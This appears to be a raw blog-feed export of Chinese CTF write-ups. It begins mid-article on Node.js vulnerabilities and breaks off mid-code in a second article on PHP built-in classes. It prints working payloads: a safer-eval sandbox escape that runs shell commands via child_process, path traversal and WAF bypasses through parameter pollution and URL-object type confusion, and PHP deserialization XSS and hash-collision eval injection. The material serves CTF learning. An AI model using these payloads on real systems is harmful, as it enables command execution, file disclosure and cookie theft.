evaluated = safeEval(code)console.log(evaluated)            // process [....]</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614691540-a0071ffe-52e2-41b4-9ac6-dfceedfa45e5.png" alt="image.png"><br> 0.4.0 的修补方法是将对象的 constructor 重新定义为 undefined，包括在 context 传入的对象：  </p><pre><code class="plsql">const safeEval = require(&#39;safe-eval&#39;)var code = &#39;this.constructor&#39;var evaluated = safeEval(code)      console.log(evaluated)             // undefinedvar code = &#39;a&#39;var evaluated2 = safeEval(code, &#123;a:&#123;&#125;)console.log(evaluated2)           // &#123;constructor: undefined&#125;</code></pre><p><strong>safe-eval  1.3.6  版本逃逸</strong></p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>payload:</p><pre><code class="plsql">(function () &#123;const process = clearImmediate.constructor(&quot;return process;&quot;)();return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()&#125;)()</code></pre><h2 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h2><h3 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h3><p>链接:<a href="https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode">https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode</a><br>这里使用docker搭建<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763162126-19b5e964-48f5-4b5f-a4a4-26f95a1993e8.png" alt="image.png"></p><p>我们查看下源代码:</p><pre><code class="plsql">const express = require(&#39;express&#39;);const bodyParser = require(&#39;body-parser&#39;);const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库const fs = require(&#39;fs&#39;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123;  if (req.path === &#39;/eval&#39;) &#123;    let delay = 60 * 1000;    console.log(delay);    if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay = Math.max(delay, parseInt(req.query.delay));    &#125;    const t = setTimeout(() =&gt; next(), delay);    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事    setTimeout(() =&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);  &#125; else &#123;    next();  &#125;&#125;);app.post(&#39;/eval&#39;, function (req, res) &#123;  let response = &#39;&#39;;  if (req.body.e) &#123;    try &#123;      response = saferEval(req.body.e);    &#125; catch (e) &#123;      response = &#39;Wrong Wrong Wrong!!!!&#39;;    &#125;  &#125;  res.send(String(response));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#39;/source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.js&#39;));&#125;);// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口app.get(&#39;/version&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./package.json&#39;));&#125;);app.get(&#39;/&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.html&#39;))&#125;)app.listen(80, &#39;0.0.0.0&#39;, () =&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763320589-54653302-1df5-408b-ba38-b77bdd27a991.png" alt="image.png"><br>在这段代码中存在safe-eval，我们查看下它得版本<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763363493-222cc8a3-42df-4e25-8f16-326a1bbc6154.png" alt="image.png"><br>1.3.6是存在漏洞的<br>我们先继续分析代码:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668771592322-95094a63-cbd9-4ada-a453-3c86ee7b6c50.png" alt="image.png"><br> 通过/eval?delay=上传一个数字并和60000比较，大的赋值给delay  </p><pre><code class="plsql">setTimeout最多只能推迟执行2147483647毫秒（24.8天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</code></pre><p> 我们传入一个大于2147483647的值即可执行next()到下一个位置<br>所以我们就可以通过get传入一个比2147483647大的值，然年使用post方式传入payload<br>safer-eval 1.3.6逃逸payload:</p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>在这里我们直接给e post传入一下内容:</p><pre><code class="plsql">(function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)()</code></pre><p>搭建的docker环境不知道为什么没有成功执行命令，放一张别人的图叭<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668772542204-bf8936f4-0bf2-48b7-9fe6-112ba4a93c59.png" alt="o_20080607581121-1.png"></p><h2 id="更多逃逸payload"><a href="#更多逃逸payload" class="headerlink" title="更多逃逸payload"></a>更多逃逸payload</h2><p><a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a><br><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><h1 id="一些有趣的挑战"><a href="#一些有趣的挑战" class="headerlink" title="一些有趣的挑战"></a>一些有趣的挑战</h1><h2 id="CSIVITU-2020-File-Library"><a href="#CSIVITU-2020-File-Library" class="headerlink" title="CSIVITU 2020-File Library"></a>CSIVITU 2020-<strong>File Library</strong></h2><p>容器地址:<a href="https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library">https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library</a><br>我们得到了任务的源代码：</p><pre><code class="javascript">const express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const app = express();const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123;   console.log(`Listening on port $&#123;PORT&#125;`);&#125;);app.get(&#39;/getFile&#39;, (req, res) =&gt; &#123;   let &#123; file &#125; = req.query;   console.log(&quot;file is: &quot;+file);   if (!file) &#123;       res.send(`file=$&#123;file&#125;\nFilename not specified!`);       return;   &#125;   try &#123;       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) &#123;           res.send(`file=$&#123;file&#125;\nInvalid filename!`);           return;       &#125;   &#125; catch (err) &#123;       res.send(&#39;An error occured!&#39;);       return;   &#125;   if (!allowedFileType(file)) &#123;       res.send(`File type not allowed`);       return;   &#125;   if (file.length &gt; 5) &#123;       file = file.slice(0, 5);   &#125;   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);  console.log(&quot;returnedFile: &quot;+returnedFile);   fs.readFile(returnedFile, (err) =&gt; &#123;       if (err) &#123;           if (err.code != &#39;ENOENT&#39;) console.log(err);           res.send(&#39;An error occured!&#39;);           return;       &#125;       res.sendFile(returnedFile);   &#125;);&#125;);app.get(&#39;/*&#39;, (req, res) =&gt; &#123;   res.sendFile(__dirname + &#39;/index.html&#39;);&#125;);function allowedFileType(file) &#123;   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);console.log(&quot;index +1 is &quot;+file.indexOf(&#39;.&#39;) + 1);    console.log(&quot;format inside allowedfile is: &quot;+format);   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;       return true;   &#125;   return false;&#125;</code></pre><p>我添加了一些日志记录语句以方便操作，正如您所见，当我们访问**/getfile**时，我们可以在 get 参数中提供一个将为我们显示的文件名，但有一些限制，我们不能使用空格或“/”，只允许四个扩展名 (js|ts|c|cpp) 。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>仔细阅读源代码后，我很确定我们会使用 http 参数污染，因为没有检查 get 参数的类型，所以我们可以输入一个数组并尝试利用可能发生的不当行为。<br>假设我们输入以下数组：</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</code></pre><ul><li><strong>第一次检查</strong>：if (file.includes(‘ ‘) || file.includes(‘/‘))</li></ul><p>当 includes 应用于数组时，它会检查是否有一个字段等于传递的参数（在我们的例子中为“”和“/”），这里为 false，因此我们可以成功通过此检查</p><ul><li><strong>第二次检查</strong>：if (!allowedFileType(file))</li></ul><p>我们来看看这个函数的代码：</p><pre><code class="javascript">function allowedFileType(file) &#123;const format = file.slice(file.indexOf(&#39;.&#39;) + 1);    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>它将从 indexOf(“.”)+1 开始对我们的数组进行切片，所以在我们的例子中，结果将是我们数组的最后一个字段，即“js”，我们也将通过此检查：<br>以下行将删除数组的最后两个字段：</p><pre><code class="javascript">if (file.length &gt; 5) &#123;  file = file.slice(0, 5);&#125;# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom</code></pre><p>所以我们的数组将变成：</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]</code></pre><p>最后在解析路径后 returnedFile 将包含 /proc/self/cwd/flag.txt</p><pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);</code></pre><p><strong>注意：</strong>由于我们的“../../”字段，当前目录的__dirname 被忽略，而**/proc/self/cwd**等同于当前目录。<br>所以最后我们的数组将被解析为我们想要的路径，这是最终的有效载荷，它只是对我们之前所说的的一种解释：</p><pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js</code></pre><h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>挑战为我们提供了<a href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">源代码</a>和一个Dockerfile. 由于 Instancer 只创建一个持续 3 分钟的挑战实例，这非常不方便，所以我使用提供的资源在本地构建和调试以玩这个挑战。<br>浏览网站localhost:3456，我们可以看到这只是一个简单的网页展示指定文件的内容。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>这个挑战的目标是读取flag.txt文件的内容……但以某种方式绕过includes(‘flag’)waf的检查。所有的挑战代码都可以在 看到main.js</p><pre><code class="javascript">const express = require(&quot;express&quot;);const fs = require(&quot;fs&quot;);const app = express();const PORT = process.env.PORT || 3456;app.use((req, res, next) =&gt; &#123;    if([req.body, req.headers, req.query].some(        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)    )) &#123;        return res.send(&quot;bad hacker!&quot;);    &#125;    next();&#125;);app.get(&quot;/&quot;, (req, res) =&gt; &#123;    try &#123;        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());           &#125;    catch(err) &#123;        console.log(err);        res.status(500).send(&quot;Internal server error&quot;);    &#125;&#125;);app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));</code></pre><p><strong>分析</strong><br>阅读源代码后，我想到了两个问题。</p><ol><li>如何绕过includes条件？（绝对……我们正在寻找的东西），以及</li><li>readFileSync该函数可以采用什么类型的参数来读取文件？</li></ol><p>通过在 Google 上搜索，我发现了一篇关于<a href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>的文章，它在某些时候类似于这个挑战：</p><ul><li>这两个挑战都没有验证输入的类型，这意味着我们可以将输入作为数组而不是字符串传递，并且</li><li>这两个挑战都需要绕过includes函数才能到达标志！</li></ul><p>太棒了！认为我找到了正确的位置，我尝试了 payload file[]=x&amp;file[]=flag.txt。不幸的是，它无法绕过这个挑战的waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>为什么它不能绕过waf？好吧，我发现这行代码的挑战之间有一个关键的不同点<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(“flag”)<br>simplewaf不采用原始输入来执行输入验证，而是预先将原始输入转换为 JSON 字符串<strong>。</strong>因此，该includes函数仍然可以检查转换后的字符串是否包含flag。<br>至此，我无论如何也想不出绕过这个includes函数……所以，我转到第二个问题，看看那个函数的NodeJS文档。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>好的，所以路径参数可以是一个<string> | <Buffer> | <URL> | <integer>. 但是，请求查询值的类型始终是字符串。我们如何传入readFileSync函数 aURL或 aninteger或 a 以外的任何其他内容string？<br>起初想到，我尝试将字符串格式化为URL: <a href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C">http://localhost:3456/wow.html。倒霉，不行</a>~</integer></URL></Buffer></string></p><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png" alt="image.png"><br>停止徒劳的猜测，我决定在<a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSync上的 NodeJS 源代码中仔细查看该功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>第 469 行及以下的代码片段执行读取文件过程，无需深入研究。我们需要深入研究的要点是第 467 行的代码。通过研究fs.openSync函数来跟踪代码。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>通过调查getValidatedPath功能继续关注。</p><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>按住不放，这里会出现一些有趣的东西。因此，如果该fileURLOrPath值不为 null，并且其中有 existshref和origin，它将调用 to fileURLToPath，将fileURLOrPath值转换为 URL。这就是我想说的！我能感觉到我走的路是对的！<br>获得动力，我继续研究这个fileURLToPath功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>该值的一个附加条件fileURLOrPath是其协议必须是file:. 全部检查通过后，会调用相应的函数从URL中获取路径。由于我在 Linux 上调试，所以我继续研究该getPathFromURLPosix功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>再次检查此代码片段：hostname必须为空。但是，这里需要注意一件值得注意的事情，它将帮助我们绕过 simplewaf 的includes检查，那就是它将对<strong>simplewaf</strong>pathname执行 URL 解码以获取 URL。这意味着如果我们pathname从 Web 应用程序传递一个双 URL 编码值，它最终将文件路径变成纯文本。你猜怎么着？由于客户端传递给includes检查的值只是 URL 解码一次，我们也可以轻松绕过此检查。<br>好的，让我们总结一下将有效参数file作为 URL传递给函数readFileSync需要做的所有事情。</p><ul><li>file不为空</li><li>file.origin存在</li><li>file.href存在</li><li>file.protocol = ‘file:’</li><li>file.hostname = ‘’</li></ul><p>绕过waf并获得标志的最终要求是：</p><ul><li>file.pathname是双重 URL 编码</li></ul><p><strong>解决方案</strong><br>根据上面的分析，我构造了如下的payload：<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>我只是对字符进行双重 URL 编码g以绕过 waf。使用有效载荷，我们成功获得了测试标志。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>好吧，先拿真旗吧~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p><h2 id="祥云杯2022-RUSTwaf"><a href="#祥云杯2022-RUSTwaf" class="headerlink" title="祥云杯2022 RUSTwaf"></a>祥云杯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);const app = express();const bodyParser = require(&quot;body-parser&quot;)const fs = require(&quot;fs&quot;)app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);app.post(&#39;/readfile&#39;, function (req, res) &#123;    let body = req.body.toString();    let file_to_read = &quot;app.js&quot;;    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;        encoding: &#39;utf-8&#39;    &#125;).trim();    try &#123;        file_to_read = JSON.parse(file)    &#125; catch (e)&#123;        file_to_read = file    &#125;    let data = fs.readFileSync(file_to_read);    res.send(data.toString());&#125;);app.get(&#39;/&#39;, function (req, res) &#123;    res.send(&#39;see `/src`&#39;);&#125;);app.get(&#39;/src&#39;, function (req, res) &#123;    var data = fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>直接/readfile读源码</p><pre><code class="javascript">use std::env;use serde::&#123;Deserialize, Serialize&#125;;use serde_json::Value;static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;#[derive(Debug, Serialize, Deserialize)]struct File&#123;    #[serde(default = &quot;default_protocol&quot;)]    pub protocol: String,    pub href: String,    pub origin: String,    pub pathname: String,    pub hostname:String&#125;pub fn default_protocol() -&gt; String &#123;    &quot;http&quot;.to_string()&#125;//protocol is default value,can&#39;t be customizedpub fn waf(body: &amp;str) -&gt; String &#123;    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;        return String::from(&quot;./main.rs&quot;); //这里限制我们不能带有flag和proc字段    &#125;    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;        if let Some(json_body_obj) = json_body.as_object() &#123;            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;                return String::from(&quot;./main.rs&quot;);    //这里限制我们的json字段不能带有protocol字段，但是下面限制我们是file结构体，这也就意味着我们一定要有protocol字段            &#125;        &#125;        //not contains protocol,check if struct is File        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//限制我们只能是这个结构体            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));        &#125;    &#125; else&#123;        //body not json        return String::from(body);    &#125;    return String::from(&quot;./main.rs&quot;);&#125;fn main() &#123;    let args: Vec&lt;String&gt; = env::args().collect();    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //这里把json的第二字段传进去&#125;</code></pre><p>将payload以json格式传，但是这里用到的payload中存在protocol导致rust能检测到，要利用unicode 绕过<br>最终payload：</p><pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node_js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php原生类学习</title>
      <link href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="查看各方法内置类"><a href="#查看各方法内置类" class="headerlink" title="查看各方法内置类"></a>查看各方法内置类</h1><p> 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  </p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p><h1 id="利用Error-Exception内置类进行XSS"><a href="#利用Error-Exception内置类进行XSS" class="headerlink" title="利用Error/Exception内置类进行XSS"></a>利用Error/Exception内置类进行XSS</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p>利用条件:<br>php7以上<br>开启报错情况下<br> Error类是php的一个常见类，用于自定义一个Error，当用户输入错误的值，回显Error页面，php7版本会存在类似的XSS漏洞。Error::__toString，Error类存在__toString的方法，该方法进行类当作字符串进行回应，也就是echo $l3ife会显示什么。php对象当作一个字符串输出（echo $l3ife）会触发to_String方法。一般用于反序列化漏洞和XSS漏洞。<br> 本地创建error.php(php版本设置为7.0)  </p><pre><code class="php">&lt;?phphighlight_file(&#39;2.php&#39;);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt; </code></pre><p> 这段反序列化函数，并不存在自定义类，不可以打反序列化，可以用php反序列化的php内置类<br>poc:</p><pre><code class="php">&lt;?php    $a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p><h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>利用条件:<br>php5、php7<br>开启报错的情况下</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt;</code></pre><p>poc:</p><pre><code class="php">&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a><strong>[BJDCTF 2nd]xss之光</strong></h2><p> 通过git拿到源码  </p><pre><code class="php">&lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;];Echo unserialize($a);</code></pre><p> 给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。<br> 思路：flag一般在COOKIE的信息里。<br>poc:</p><pre><code class="php">&lt;?php$poc=new    Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);Echo urlencode(serialize($poc));?&gt;反弹cookie</code></pre><p> 将得到的结果传入<br>/?yds_is_so_beautiful=$POC  </p><h1 id="利用Error-Exception-内置类绕过哈希比较"><a href="#利用Error-Exception-内置类绕过哈希比较" class="headerlink" title="利用Error/Exception 内置类绕过哈希比较"></a>利用Error/Exception 内置类绕过哈希比较</h1><p> 测试代码  :</p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;</code></pre><p> 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。  </p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\r\n\r\n&quot;;echo $b;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。<br>可以利用这个方法果然哈希比较。  </p><h2 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a><strong>[2020 极客大挑战]Greatphp</strong></h2><p> 考点：php内置绕过哈希比较、php取反绕过  </p><pre><code class="php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p> 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。<br>主要是绕过这个</p><pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code></pre><p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="img"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p><pre><code class="php">&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;&#125;//$cmd = &quot;flag.php&quot;;//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;//print $str;echo &quot;\r\n\r\n&quot;;$c = new SYCLOVER();$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);echo urlencode(serialize($c));?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="img"><br>这里其实有一个地方要注意:</p><pre><code 